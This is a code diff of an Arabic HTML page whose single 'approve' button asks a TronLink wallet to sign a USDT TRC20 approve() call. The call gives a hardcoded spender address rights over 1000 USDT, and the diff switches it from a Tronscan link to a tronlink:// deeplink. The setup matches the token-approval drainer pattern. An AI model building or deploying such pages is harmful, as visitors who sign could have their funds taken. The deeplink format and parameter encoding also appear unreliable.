@@ -2,7 +2,7 @@
 <html lang="ar">
 <head>
   <meta charset="UTF-8" />
-  <title>موافقة USDT TRC20 على TRON</title>
+  <title>فتح TronLink لتوقيع approve</title>
   <style>
     body {
       font-family: Arial, sans-serif;
@@ -14,25 +14,38 @@
       padding: 10px 20px;
       cursor: pointer;
     }
+    #status {
+      margin-top: 20px;
+      color: red;
+    }
   </style>
 </head>
 <body>
 
-<h1>موافقة 1000 USDT (TRؤؤؤؤؤؤC20) لمحفظة TRONLINL</h1>
-<button id="approveBtn">موافقة</button>
+<h1>فتح TronLink لتوقيع 1000 USDT (approve)</h1>
+<button id="openTronLinkBtn">موافقة</button>
+<div id="status"></div>
 
 <script>
   const usdtContractAddress = 'TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn';
   const spenderAddress = 'TWNvNo7d79eQ8VtZUeBoLjtyPYrYn6yXJf';
-  const amount = 1000 * 1_000_000; // 1000 USDT (6 أرقام عشرية)
+  const amount = 1000 * 1_000_000; // 1000 USDT مع 6 أرقام عشرية
 
-  const approveBtn = document.getElementById('approveBtn');
+  const statusDiv = document.getElementById('status');
+  const btn = document.getElementById('openTronLinkBtn');
 
-  approveBtn.addEventListener('click', () => {
+  btn.addEventListener('click', () => {
+    // إعداد رابط deeplink
     const params = encodeURIComponent(`${spenderAddress},${amount}`);
-    const url = `https://tronscan.org/#/contract-call?contract=${usdtContractAddress}&function=approve&parameter=${params}&network=mainnet`;
+    const deeplink = `tronlink://contract-call?contract=${usdtContractAddress}&function=approve&parameter=${params}`;
 
-    window.location.href = url;
+    // محاولة فتح التطبيق
+    window.location.href = deeplink;
+
+    // لو التطبيق مش موجود (بعد ثواني) نعرض رسالة
+    setTimeout(() => {
+      statusDiv.textContent = 'لم يتم العثور على تطبيق TronLink. يرجى تثبيته أولاً.';
+    }, 2000);
   });
 </script>
 
